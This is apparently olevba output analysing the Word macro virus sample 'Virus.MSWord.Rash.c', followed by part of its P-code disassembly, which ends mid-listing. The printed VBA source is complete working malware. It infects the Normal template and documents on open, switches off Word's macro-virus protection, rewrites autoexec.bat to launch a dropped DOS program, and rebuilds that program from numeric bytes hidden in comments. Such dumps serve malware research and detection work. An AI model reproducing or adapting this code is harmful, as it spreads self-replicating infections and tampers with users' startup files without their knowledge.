olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rash.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rash.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Private Sub asder()
Dim marr(999)
lll = 0
nars = "c:\autoexec.bat"
mars = "c:\drvbin.com"
Open nars For Input As #1
Do While Not EOF(1)
    Line Input #1, k
    marr(lll) = k
    lll = lll + 1
Loop
Close #1
If marr(1) = mars Then GoTo endar
Open nars For Output As #1
 Print #1, "echo off"
 Print #1, mars
For j = 0 To (lll - 1)
 Print #1, marr(j)
Next j
Close #1
Open mars For Output Access Write As #1
  col = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   For i = 1 To col
     marr(i) = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Next i
   For i = 1 To col
    If Left(marr(i), 5) = "Rem #" Then fl = 1
     If Left(marr(i), 5) = "Rem E" Then fl = 0
      If fl = 1 Then
       p = Len(marr(i))
       p = p - 6
       tex = Right(marr(i), p)
       lll = 0
       Dim AD As Variant
       AD = Array(0, 0, 0, 0)
       Dim RAD As Variant
       RAD = Array(100, 10, 1, 0)
        For j = 1 To p
         kj = Mid(tex, j, 1)
         If kj = "#" Then
          j = p
          GoTo sasa
         ElseIf kj = "," Then
          GoTo asas
         Else
           AD(lll) = Asc(kj) - 48
           lll = lll + 1
           GoTo sasa
         End If
asas:   sum = 0
        kum = 2
        For j1 = (lll - 1) To 0 Step -1
         sum = sum + AD(j1) * RAD(kum)
         kum = kum - 1
        Next j1
        Print #1, Chr(sum);
        lll = 0
sasa:   Next j
      End If
   Next i
Close #1
Rem # 14,31,184,3,0,205,16,228,97,138,#
Rem # 224,12,128,230,97,134,224,230,97,184,#
Rem # 0,184,142,192,184,6,0,205,16,185,#
Rem # 0,64,51,255,179,255,232,173,0,50,#
Rem # 219,51,201,186,240,0,131,234,8,232,#
Rem # 109,0,139,193,232,167,0,139,193,184,#
Rem # 1,0,232,190,0,184,200,0,43,193,#
Rem # 232,151,0,131,193,4,131,249,94,118,#
Rem # 221,184,99,0,232,137,0,51,201,51,#
Rem # 219,74,232,66,0,81,209,233,209,233,#
Rem # 209,233,191,144,16,232,104,0,191,144,#
Rem # 48,232,98,0,191,224,16,43,249,232,#
Rem # 90,0,191,224,48,43,249,232,82,0,#
Rem # 89,184,1,0,232,118,0,131,193,9,#
Rem # 129,249,63,1,118,201,232,54,0,180,#
Rem # 0,205,22,60,27,117,116,180,76,205,#
Rem # 33,80,83,82,139,218,184,221,52,186,#
Rem # 18,0,59,211,115,23,247,243,139,216,#
Rem # 228,97,12,3,230,97,176,11,186,67,#
Rem # 0,238,74,138,195,238,138,199,238,90,#
Rem # 91,88,195,80,228,97,36,252,230,97,#
Rem # 88,195,80,81,87,138,195,252,242,170,#
Rem # 95,89,88,195,80,81,82,87,209,232,#
Rem # 185,80,0,246,225,139,248,185,64,1,#
Rem # 232,225,255,129,199,0,32,232,218,255,#
Rem # 95,90,89,88,195,83,30,51,219,142,#
Rem # 219,187,108,4,3,7,59,7,119,252,#
Rem # 31,91,195,14,31,184,3,0,205,16,#
Rem # 186,127,2,180,9,205,33,180,0,205,#
Rem # 22,60,27,117,3,233,115,255,180,15,#
Rem # 205,16,128,252,80,117,62,186,70,0,#
Rem # 232,104,255,228,64,36,63,138,216,185,#
Rem # 3,0,51,246,51,237,180,2,139,213,#
Rem # 128,194,30,138,241,205,16,180,9,46,#
Rem # 138,130,47,4,81,185,1,0,205,16,#
Rem # 89,69,131,253,20,114,225,131,198,20,#
Rem # 65,131,249,22,114,214,232,90,255,180,#
Rem # 0,205,22,60,27,117,3,233,33,255,#
Rem # 233,129,254,201,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,187,13,10,186,32,32,#
Rem # 32,32,32,32,143,144,136,130,133,146,#
Rem # 32,130,135,139,142,140,153,136,138,128,#
Rem # 140,32,151,147,134,136,149,32,130,136,#
Rem # 144,147,145,142,130,33,32,130,235,32,#
Rem # 168,172,165,165,226,165,32,164,165,171,#
Rem # 174,32,225,58,32,32,32,32,186,13,#
Rem # 10,186,32,86,105,114,117,115,32,42,#
Rem # 42,42,32,77,65,82,75,73,90,45,#
Rem # 50,32,42,42,42,32,102,111,114,32,#
Rem # 67,79,77,38,69,88,69,38,79,86,#
Rem # 76,32,102,105,108,101,115,32,115,112,#
Rem # 101,99,105,102,105,99,97,116,105,111,#
Rem # 110,32,186,13,10,186,32,32,32,32,#
Rem # 32,32,40,67,41,32,98,121,32,80,#
Rem # 76,99,97,116,44,32,118,101,114,115,#
Rem # 105,111,110,32,50,46,48,32,47,101,#
Rem # 120,112,101,114,105,109,101,110,116,97,#
Rem # 108,32,118,101,114,115,105,111,110,47,#
Rem # 32,32,32,32,32,32,186,13,10,186,#
Rem # 32,32,67,114,101,97,116,101,100,32,#
Rem # 105,110,32,65,108,109,97,116,121,44,#
Rem # 32,75,97,122,97,107,104,115,116,97,#
Rem # 110,44,32,50,49,46,48,53,46,57,#
Rem # 53,46,32,132,174,32,173,174,162,235,#
Rem # 229,32,162,225,226,224,165,231,33,32,#
Rem # 186,13,10,200,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,188,13,10,32,80,46,#
Rem # 83,46,32,136,167,162,168,173,168,226,#
Rem # 165,44,32,239,44,32,170,160,166,165,#
Rem # 226,225,239,44,32,173,165,231,160,239,#
Rem # 173,173,174,32,175,174,162,168,225,32,#
Rem # 46,46,46,32,36,201,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,187,186,219,219,176,176,#
Rem # 176,176,219,176,176,176,176,219,176,176,#
Rem # 176,219,176,176,186,186,219,176,176,176,#
Rem # 176,219,219,219,176,176,176,176,219,176,#
Rem # 219,176,176,176,186,186,219,176,176,176,#
Rem # 219,219,219,219,219,176,176,219,219,219,#
Rem # 219,219,176,176,186,186,219,176,176,176,#
Rem # 219,219,219,219,219,176,176,219,177,219,#
Rem # 177,219,176,47,186,186,219,176,176,219,#
Rem # 219,219,219,219,219,219,176,219,219,219,#
Rem # 219,219,47,32,186,186,219,176,219,219,#
Rem # 219,219,219,219,219,219,219,219,219,176,#
Rem # 219,219,45,45,186,186,219,176,219,219,#
Rem # 219,219,176,219,219,219,176,176,219,219,#
Rem # 219,176,92,32,186,186,219,219,219,219,#
Rem # 219,219,176,219,219,219,176,176,176,219,#
Rem # 176,176,176,92,186,186,176,219,219,219,#
Rem # 219,219,176,219,219,219,176,176,176,176,#
Rem # 176,176,176,176,186,186,176,176,219,219,#
Rem # 219,219,176,219,219,219,219,176,176,176,#
Rem # 176,176,176,176,186,186,176,219,219,176,#
Rem # 219,219,176,176,219,176,219,176,176,176,#
Rem # 176,176,176,176,186,186,176,219,219,176,#
Rem # 219,219,176,176,219,176,176,219,176,176,#
Rem # 176,176,176,176,186,186,176,219,176,176,#
Rem # 219,176,176,176,176,219,176,219,176,176,#
Rem # 176,176,176,176,186,186,176,219,176,176,#
Rem # 219,176,176,176,176,219,176,219,176,176,#
Rem # 176,176,176,176,186,186,176,219,176,176,#
Rem # 219,176,176,176,176,219,176,176,219,176,#
Rem # 176,176,176,176,186,186,176,176,219,176,#
Rem # 176,219,176,176,176,176,219,176,219,176,#
Rem # 176,176,176,176,186,186,32,77,32,65,#
Rem # 32,82,32,75,32,73,32,90,32,196,#
Rem # 196,32,50,32,186,200,205,205,205,205,#
Rem # 205,205,205,205,205,205,205,205,205,205,#
Rem # 205,205,205,205,188,#
Rem E
endar:
End Sub
Private Sub maina()
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
On Error Resume Next
cora = "Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
Dim bas(999)
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
bo1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
bo2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
KK = 0
If bo1 <> cora Then
Set bst = NormalTemplate.VBProject.VBComponents.Item(1)
KK = 1
End If
If bo2 <> cora Then
Set bst = ActiveDocument.VBProject.VBComponents.Item(1)
KK = 1
End If
If KK > 0 Then
bol = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  For bi = 1 To bol
   bas(bi) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(bi, 1)
  Next bi
  For bi = 1 To bol
   bst.CodeModule.InsertLines bi, bas(bi)
  Next bi
End If
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
End Sub

Private Sub Document_New()
 maina
End Sub

Private Sub Document_Open()
 asder
 maina
End Sub
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rash.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15924 bytes
' Line #0:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #1:
' 	FuncDefn (Private Sub asder())
' Line #2:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x03E7 
' 	VarDefn marr
' Line #3:
' 	LitDI2 0x0000 
' 	St lll 
' Line #4:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St nars 
' Line #5:
' 	LitStr 0x000D "c:\drvbin.com"
' 	St mars 
' Line #6:
' 	Ld nars 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #7:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld k 
' 	LineInput 
' Line #9:
' 	Ld k 
' 	Ld lll 
' 	ArgsSt marr 0x0001 
' Line #10:
' 	Ld lll 
' 	LitDI2 0x0001 
' 	Add 
' 	St lll 
' Line #11:
' 	Loop 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #13:
' 	LitDI2 0x0001 
' 	ArgsLd marr 0x0001 
' 	Ld mars 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo endar 
' 	EndIf 
' Line #14:
' 	Ld nars 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "echo off"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld mars 
' 	PrintItemNL 
' Line #17:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld lll 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	For 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld j 
' 	ArgsLd marr 0x0001 
' 	PrintItemNL 
' Line #19:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #21:
' 	Ld mars 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #22:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St col 
' Line #23:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld col 
' 	For 
' Line #24:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld i 
' 	ArgsSt marr 0x0001 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld col 
' 	For 
' Line #27:
' 	Ld i 
' 	ArgsLd marr 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Rem #"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St fl 
' 	EndIf 
' Line #28:
' 	Ld i 
' 	ArgsLd marr 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Rem E"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St fl 
' 	EndIf 
' Line #29:
' 	Ld fl 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld i 
' 	ArgsLd marr 0x0001 
' 	FnLen 
' 	St p 
' Line #31:
' 	Ld p 
' 	LitDI2 0x0006 
' 	Sub 
' 	St p 
' Line #32:
' 	Ld i 
' 	ArgsLd marr 0x0001 
' 	Ld p 
' 	ArgsLd Right 0x0002 
' 	St tex 
' Line #33:
' 	LitDI2 0x0000 
' 	St lll 
' Line #34:
' 	Dim 
' 	VarDefn AD (As Variant)
' Line #35:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsArray Array 0x0004 
' 	St AD 
' Line #36:
' 	Dim 
' 	VarDefn RAD (As Variant)
' Line #37:
' 	LitDI2 0x0064 
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsArray Array 0x0004 
' 	St RAD 
' Line #38:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld p 
' 	For 
' Line #39:
' 	Ld tex 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St kj 
' Line #40:
' 	Ld kj 
' 	LitStr 0x0001 "#"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld p 
' 	St j 
' Line #42:
' 	GoTo sasa 
' Line #43:
' 	Ld kj 
' 	LitStr 0x0001 ","
' 	Eq 
' 	ElseIfBlock 
' Line #44:
' 	GoTo asas 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	Ld kj 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0030 
' 	Sub 
' 	Ld lll 
' 	ArgsSt AD 0x0001 
' Line #47:
' 	Ld lll 
' 	LitDI2 0x0001 
' 	Add 
' 	St lll 
' Line #48:
' 	GoTo sasa 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Label asas 
' 	LitDI2 0x0000 
' 	St sum 
' Line #51:
' 	LitDI2 0x0002 
' 	St kum 
' Line #52:
' 	StartForVariable 
' 	Ld j1 
' 	EndForVariable 
' 	Ld lll 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #53:
' 	Ld sum 
' 	Ld j1 
' 	ArgsLd AD 0x0001 
' 	Ld kum 
' 	ArgsLd RAD 0x0001 
' 	Mul 
' 	Add 
' 	St sum 
' Line #54:
' 	Ld kum 
' 	LitDI2 0x0001 
' 	Sub 
' 	St kum 
' Line #55:
' 	StartForVariable 
' 	Ld j1 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld sum 
' 	ArgsLd Chr 0x0001 
' 	PrintItemSemi 
' 	PrintEoS 
' Line #57:
' 	LitDI2 0x0000 
' 	St lll 
' Line #58:
' 	Label sasa 
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #62:
' 	Rem 0x0024 " # 14,31,184,3,0,205,16,228,97,138,#"
' Line #63:
' 	Rem 0x0029 " # 224,12,128,230,97,134,224,230,97,184,#"
' Line #64:
' 	Rem 0x0025 " # 0,184,142,192,184,6,0,205,16,185,#"
' Line #65:
' 	Rem 0x0025 " # 0,64,51,255,179,255,232,173,0,50,#"
' Line #66:
' 	Rem 0x0027 " # 219,51,201,186,240,0,131,234,8,232,#"
' Line #67:
' 	Rem 0x0028 " # 109,0,139,193,232,167,0,139,193,184,#"
' Line #68:
' 	Rem 0x0023 " # 1,0,232,190,0,184,200,0,43,193,#"
' Line #69:
' 	Rem 0x0027 " # 232,151,0,131,193,4,131,249,94,118,#"
' Line #70:
' 	Rem 0x0025 " # 221,184,99,0,232,137,0,51,201,51,#"
' Line #71:
' 	Rem 0x0027 " # 219,74,232,66,0,81,209,233,209,233,#"
' Line #72:
' 	Rem 0x0029 " # 209,233,191,144,16,232,104,0,191,144,#"
' Line #73:
' 	Rem 0x0026 " # 48,232,98,0,191,224,16,43,249,232,#"
' Line #74:
' 	Rem 0x0024 " # 90,0,191,224,48,43,249,232,82,0,#"
' Line #75:
' 	Rem 0x0023 " # 89,184,1,0,232,118,0,131,193,9,#"
' Line #76:
' 	Rem 0x0026 " # 129,249,63,1,118,201,232,54,0,180,#"
' Line #77:
' 	Rem 0x0026 " # 0,205,22,60,27,117,116,180,76,205,#"
' Line #78:
' 	Rem 0x0027 " # 33,80,83,82,139,218,184,221,52,186,#"
' Line #79:
' 	Rem 0x0027 " # 18,0,59,211,115,23,247,243,139,216,#"
' Line #80:
' 	Rem 0x0025 " # 228,97,12,3,230,97,176,11,186,67,#"
' Line #81:
' 	Rem 0x0028 " # 0,238,74,138,195,238,138,199,238,90,#"
' Line #82:
' 	Rem 0x0026 " # 91,88,195,80,228,97,36,252,230,97,#"
' Line #83:
' 	Rem 0x0028 " # 88,195,80,81,87,138,195,252,242,170,#"
' Line #84:
' 	Rem 0x0025 " # 95,89,88,195,80,81,82,87,209,232,#"
' Line #85:
' 	Rem 0x0026 " # 185,80,0,246,225,139,248,185,64,1,#"
' Line #86:
' 	Rem 0x0029 " # 232,225,255,129,199,0,32,232,218,255,#"
' Line #87:
' 	Rem 0x0025 " # 95,90,89,88,195,83,30,51,219,142,#"
' Line #88:
' 	Rem 0x0023 " # 219,187,108,4,3,7,59,7,119,252,#"
' Line #89:
' 	Rem 0x0023 " # 31,91,195,14,31,184,3,0,205,16,#"
' Line #90:
' 	Rem 0x0025 " # 186,127,2,180,9,205,33,180,0,205,#"
' Line #91:
' 	Rem 0x0026 " # 22,60,27,117,3,233,115,255,180,15,#"
' Line #92:
' 	Rem 0x0026 " # 205,16,128,252,80,117,62,186,70,0,#"
' Line #93:
' 	Rem 0x0029 " # 232,104,255,228,64,36,63,138,216,185,#"
' Line #94:
' 	Rem 0x0024 " # 3,0,51,246,51,237,180,2,139,213,#"
' Line #95:
' 	Rem 0x0027 " # 128,194,30,138,241,205,16,180,9,46,#"
' Line #96:
' 	Rem 0x0023 " # 138,130,47,4,81,185,1,0,205,16,#"
' Line #97:
' 	Rem 0x0028 " # 89,69,131,253,20,114,225,131,198,20,#"
' Line #98:
' 	Rem 0x0029 " # 65,131,249,22,114,214,232,90,255,180,#"
' Line #99:
' 	Rem 0x0024 " # 0,205,22,60,27,117,3,233,33,255,#"
' Line #100:
' 	Rem 0x002C " # 233,129,254,201,205,205,205,205,205,205,#"
' Line #101:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #102:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #103:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #104:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #105:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #106:
' 	Rem 0x0028 " # 205,205,205,205,187,13,10,186,32,32,#"
' Line #107:
' 	Rem 0x0028 " # 32,32,32,32,143,144,136,130,133,146,#"
' Line #108:
' 	Rem 0x002B " # 32,130,135,139,142,140,153,136,138,128,#"
' Line #109:
' 	Rem 0x002A " # 140,32,151,147,134,136,149,32,130,136,#"
' Line #110:
' 	Rem 0x0029 " # 144,147,145,142,130,33,32,130,235,32,#"
' Line #111:
' 	Rem 0x002B " # 168,172,165,165,226,165,32,164,165,171,#"
' Line #112:
' 	Rem 0x0025 " # 174,32,225,58,32,32,32,32,186,13,#"
' Line #113:
' 	Rem 0x0027 " # 10,186,32,86,105,114,117,115,32,42,#"
' Line #114:
' 	Rem 0x0022 " # 42,42,32,77,65,82,75,73,90,45,#"
' Line #115:
' 	Rem 0x0025 " # 50,32,42,42,42,32,102,111,114,32,#"
' Line #116:
' 	Rem 0x0022 " # 67,79,77,38,69,88,69,38,79,86,#"
' Line #117:
' 	Rem 0x0029 " # 76,32,102,105,108,101,115,32,115,112,#"
' Line #118:
' 	Rem 0x0029 " # 101,99,105,102,105,99,97,116,105,111,#"
' Line #119:
' 	Rem 0x0025 " # 110,32,186,13,10,186,32,32,32,32,#"
' Line #120:
' 	Rem 0x0023 " # 32,32,40,67,41,32,98,121,32,80,#"
' Line #121:
' 	Rem 0x0027 " # 76,99,97,116,44,32,118,101,114,115,#"
' Line #122:
' 	Rem 0x0026 " # 105,111,110,32,50,46,48,32,47,101,#"
' Line #123:
' 	Rem 0x002B " # 120,112,101,114,105,109,101,110,116,97,#"
' Line #124:
' 	Rem 0x002A " # 108,32,118,101,114,115,105,111,110,47,#"
' Line #125:
' 	Rem 0x0024 " # 32,32,32,32,32,32,186,13,10,186,#"
' Line #126:
' 	Rem 0x0027 " # 32,32,67,114,101,97,116,101,100,32,#"
' Line #127:
' 	Rem 0x0028 " # 105,110,32,65,108,109,97,116,121,44,#"
' Line #128:
' 	Rem 0x0027 " # 32,75,97,122,97,107,104,115,116,97,#"
' Line #129:
' 	Rem 0x0023 " # 110,44,32,50,49,46,48,53,46,57,#"
' Line #130:
' 	Rem 0x0028 " # 53,46,32,132,174,32,173,174,162,235,#"
' Line #131:
' 	Rem 0x0029 " # 229,32,162,225,226,224,165,231,33,32,#"
' Line #132:
' 	Rem 0x002A " # 186,13,10,200,205,205,205,205,205,205,#"
' Line #133:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #134:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #135:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #136:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #137:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #138:
' 	Rem 0x0027 " # 205,205,205,205,188,13,10,32,80,46,#"
' Line #139:
' 	Rem 0x0029 " # 83,46,32,136,167,162,168,173,168,226,#"
' Line #140:
' 	Rem 0x0028 " # 165,44,32,239,44,32,170,160,166,165,#"
' Line #141:
' 	Rem 0x002A " # 226,225,239,44,32,173,165,231,160,239,#"
' Line #142:
' 	Rem 0x002A " # 173,173,174,32,175,174,162,168,225,32,#"
' Line #143:
' 	Rem 0x0027 " # 46,46,46,32,36,201,205,205,205,205,#"
' Line #144:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #145:
' 	Rem 0x002C " # 205,205,205,205,187,186,219,219,176,176,#"
' Line #146:
' 	Rem 0x002C " # 176,176,219,176,176,176,176,219,176,176,#"
' Line #147:
' 	Rem 0x002C " # 176,219,176,176,186,186,219,176,176,176,#"
' Line #148:
' 	Rem 0x002C " # 176,219,219,219,176,176,176,176,219,176,#"
' Line #149:
' 	Rem 0x002C " # 219,176,176,176,186,186,219,176,176,176,#"
' Line #150:
' 	Rem 0x002C " # 219,219,219,219,219,176,176,219,219,219,#"
' Line #151:
' 	Rem 0x002C " # 219,219,176,176,186,186,219,176,176,176,#"
' Line #152:
' 	Rem 0x002C " # 219,219,219,219,219,176,176,219,177,219,#"
' Line #153:
' 	Rem 0x002B " # 177,219,176,47,186,186,219,176,176,219,#"
' Line #154:
' 	Rem 0x002C " # 219,219,219,219,219,219,176,219,219,219,#"
' Line #155:
' 	Rem 0x002A " # 219,219,47,32,186,186,219,176,219,219,#"
' Line #156:
' 	Rem 0x002C " # 219,219,219,219,219,219,219,219,219,176,#"
' Line #157:
' 	Rem 0x002A " # 219,219,45,45,186,186,219,176,219,219,#"
' Line #158:
' 	Rem 0x002C " # 219,219,176,219,219,219,176,176,219,219,#"
' Line #159:
' 	Rem 0x002A " # 219,176,92,32,186,186,219,219,219,219,#"
' Line #160:
' 	Rem 0x002C " # 219,219,176,219,219,219,176,176,176,219,#"
' Line #161:
' 	Rem 0x002B " # 176,176,176,92,186,186,176,219,219,219,#"
' Line #162:
' 	Rem 0x002C " # 219,219,176,219,219,219,176,176,176,176,#"
' Line #163:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,176,219,219,#"
' Line #164:
' 	Rem 0x002C " # 219,219,176,219,219,219,219,176,176,176,#"
' Line #165:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,219,219,176,#"
' Line #166:
' 	Rem 0x002C " # 219,219,176,176,219,176,219,176,176,176,#"
' Line #167:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,219,219,176,#"
' Line #168:
' 	Rem 0x002C " # 219,219,176,176,219,176,176,219,176,176,#"
' Line #169:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,219,176,176,#"
' Line #170:
' 	Rem 0x002C " # 219,176,176,176,176,219,176,219,176,176,#"
' Line #171:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,219,176,176,#"
' Line #172:
' 	Rem 0x002C " # 219,176,176,176,176,219,176,219,176,176,#"
' Line #173:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,219,176,176,#"
' Line #174:
' 	Rem 0x002C " # 219,176,176,176,176,219,176,176,219,176,#"
' Line #175:
' 	Rem 0x002C " # 176,176,176,176,186,186,176,176,219,176,#"
' Line #176:
' 	Rem 0x002C " # 176,219,176,176,176,176,219,176,219,176,#"
' Line #177:
' 	Rem 0x0028 " # 176,176,176,176,186,186,32,77,32,65,#"
' Line #178:
' 	Rem 0x0023 " # 32,82,32,75,32,73,32,90,32,196,#"
' Line #179:
' 	Rem 0x0029 " # 196,32,50,32,186,200,205,205,205,205,#"
' Line #180:
' 	Rem 0x002C " # 205,205,205,205,205,205,205,205,205,205,#"
' Line #181:
' 	Rem 0x0018 " # 205,205,205,205,188,#"
' Line #182:
' 	Rem 0x0002 " E"
' Line #183:
' 	Label endar 
' Line #184:
' 	EndSub 
' Line #185:
' 	FuncDefn (Private Sub maina())
' Line #186:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #187:
' 	Rem 0x0040 " + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+"
' Line #188:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' 	LitStr 0x0043 "Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' 	St cora 
' Line #191:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x03E7 
' 	VarDefn bas
' Line #192:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #193:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St bo1 
' Line #194:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St bo2 
' Line #195:
' 	LitDI2 0x0000 
' 	St KK 
' Line #196:
' 	Ld bo1 
' 	Ld cora 
' 	Ne 
' 	IfBlock 
' Line #197:
' 	SetStmt 
' 	LitDI2 0x0001 
